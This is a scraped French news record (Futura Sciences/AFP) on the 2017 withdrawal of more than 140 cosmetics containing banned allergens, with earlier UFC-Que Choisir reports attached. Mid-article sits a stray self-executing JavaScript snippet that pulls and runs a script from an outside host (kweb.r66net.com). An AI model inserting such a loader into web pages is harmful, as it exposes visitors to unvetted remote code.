{"title": "Cosmétiques : 140 produits retirés de la vente à cause de substances interdites", "newspaper": "Futura Sciences", "author": "Paris - AFP", "date_publi": "27/10/2017", "content": "Après les révélations de l'association d'UFC-Que choisir, que nous rapportions au début de l'année, les autorités ont effectué des contrôles. Résultat : 140 références ont dû être retirées de la vente. Elles contenaient en effet des allergènes interdits. Les fabricants mettent parfois un certain temps à réagir. Plus de 140 références de produits  cosmétiques  contenant des substances interdites ont été découvertes suite à des contrôles, a annoncé jeudi la Direction générale de la concurrence, de la consommation et de la répression des fraudes (DGCCRF).  « Ces produits ont fait l'objet d'une prescription de retrait immédiat » , a-t-elle indiqué dans un  communiqué . L'enquête visait notamment des traces de méthylisothiazolinone (MIT) et d' isobutylparaben , deux substances interdites depuis respectivement le 12 février 2017 et depuis le 30 juillet 2015, en raison  « des réactions allergiques qu'elles peuvent causer » . La DGCCRF avait annoncé cette opération en juin, à la suite d'informations de l'association UFC-Que Choisir. L'association avait indiqué avoir répertorié 23 cosmétiques toujours en vente en France, bien que contenant des substances interdites.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Des produits interdits retirés à la dernière minute... L'enquête de la DGCCRF a révélé que certains produits incriminés ne contenaient plus les substances interdites mais que l'étiquetage n'ayant pas été actualisé, ils figuraient toujours dessus. Quant aux cosmétiques contenant effectivement lesdites substances, la DGCCRF a pointé des fabricants qui  « se sont efforcés d'écouler leurs stocks jusqu'à une date très proche »  de l'entrée en vigueur de l'interdiction, et des distributeurs aux connaissances  « parfois limitées »  de la réglementation.  Enfin, deux fabricants ont été épinglés pour avoir  « poursuivi l'utilisation et la commercialisation de ces conservateurs »  après leur interdiction. Les concernant,  « des procès-verbaux d'infraction seront transmis prochainement à la justice » , a précisé la DGCCRF. Pour en savoir plus UFC-Que Choisir épingle 400 produits Article AFP publié le 22 février 2017 L'association UFC-Que Choisir recense désormais près de 400 produits cosmétiques  « contenant un ou plusieurs ingrédients indésirables » . Elle appelle les pouvoirs publics à  « instaurer des mesures réglementaires plus protectrices » . Depuis son lancement en février 2016, la liste de  produits cosmétiques   « contenant un ou plusieurs ingrédients indésirables »  a plus que doublé, déplore dans un  communiqué  l'association UFC-Que Choisir. Celle-ci a dans sa ligne de mire  « onze substances ou familles de substances indésirables préoccupantes » , dont les  perturbateurs endocriniens  tels que le BHA ou les butyl- et propyl-parabens, ainsi que des  allergènes  comme la méthylisothiazolinone (MIT). « Même les  produits pour bébés  ne sont pas épargnés » , souligne l'organisme de protection des consommateurs, en regrettant par exemple la présence de phénoxyéthanol, un conservateur toxique pour le  foie , dans plusieurs crèmes destinées aux nourrissons. Près de 400 produits cosmétiques ont été épinglés par l'association UFC-Que Choisir. © Davizro, Itsock.com                               Une réglementation bien trop laxiste Certains industriels ont bien modifié la composition de leurs produits mais  « ces changements de formules restent malheureusement bien trop rares, puisqu'un an après notre première étude  [voir article ci-dessous,  NDLR ] , 90 % des produits incriminés en 2016 contiennent toujours les mêmes substances indésirables » .  « Mis à part quelques rares produits en infraction avec la loi, la présence de ces composés indésirables est légale, à la faveur d'une réglementation laxiste »,  regrette l'UFC-Que Choisir. Par exemple, pour les perturbateurs endocriniens,  « les projets de définitions proposés par la Commission européenne exigent un niveau de preuve si élevé que, dans la pratique, aucune substance ne se verrait interdite » . L'organisme appelle donc les pouvoirs publics européens à  « mettre en œuvre sans délai les recommandations des experts en  matière  de retrait des substances, [à] encadrer strictement les allégations d'étiquetage [telles que les mentions \"hypoallergénique\" ou \"sans  paraben \", NDLR] et, plus généralement, [à] proposer une nouvelle définition des perturbateurs endocriniens permettant un retrait effectif de ces substances nocives » . Voir la liste des produits testés  ici . En 2016, l'association suspectait déjà 185 cosmétiques Article de  Jean-Luc Goudet  publié le 22/02/2016 En examinant des shampoings, des crèmes pour le visage en passant par les lotions après-rasage et les lingettes pour bébés, l'UFC-Que Choisir a débusqué une liste de 26  molécules  réputées  allergènes . En soi, ce n'est pas une surprise puisque leur nom figure sur l'étiquette. Mais l'association souligne que des risques existent peut-être, comme des études l'ont montré. Une semaine après l' ONG WECF  ( Women in Europe for a Common Future ), l'association UFC-Que Choisir revient à la charge sur les produits allergènes dans les cosmétiques. (Voir le  communiqué de l'UFC .) Sur les 185 produits pris en compte (dentifrices, déodorants, shampoings, parfums...), 62 contiennent des substances reconnues comme pouvant provoquer des  allergies  chez certaines personnes. Pour 55 d'entre eux, il s'agit du désormais célèbre méthylisothiazolinone, alias MIT. Utilisé comme conservateur, et remplaçant les non-regrettés  parabens , il est d'un usage courant dans les crèmes pour le visage et bien d'autres produits. Cette molécule est mise en cause depuis plusieurs années dans des cas d'allergies et de  dermatites . En 2014, la revue  Pediatrics  étudiait six cas d'allergies chez des bébés causés par des lingettes incorporant ce MIT. On l'appelle MIT, ou méthylisothiazolinone. C'est un conservateur très utilisé mais qui a tendance à titiller le système immunitaire. © DR                               Un risque d'allergie Concernant ce produit, dans le collimateur des scientifiques depuis plusieurs années, le CSSC (Comité scientifique pour la sécurité des consommateurs), qui dépend de la Commission européenne, a publié les résultats d'une  consultation publique . La conclusion est que le produit peut être utilisé sans risque avec une concentration faible (0,0015 %),  « dans les produits à rincer, indépendamment de son potentiel de sensibilisation » . Il y a donc une distinction entre les produits que l'on utilise brièvement, comme un  liquide  à vaisselle, voire un dentifrice, et une crème qui va rester sur la peau durant un long moment. L'association UFC-Que Choisir indique une liste de 26  produits cosmétiques , avec leurs noms commerciaux et celle des produits à risque, à traquer sur les étiquettes, dans une  carte papier  à découper dans la revue ou à imprimer depuis le site. Soulignons qu'il s'agit bien de risque, et non de  toxicité . Un certain nombre de personnes pourront développer une  allergie  et les autres non. Quant aux doses acceptables, qui dépendent de la concentration et de l'utilisation, elles ne sont pas indiquées. La seule présence d'une faible quantité d'un produit allergène ne signifie pas qu'il y aura allergie. Bref, pas de panique. Il est vrai que les allergies sont devenues le mal du siècle et que l'exposition à une multitude de produits de ce genre n'y est sans doute pas étrangère, mais il y a d'autres facteurs... ", "theme": "sante"}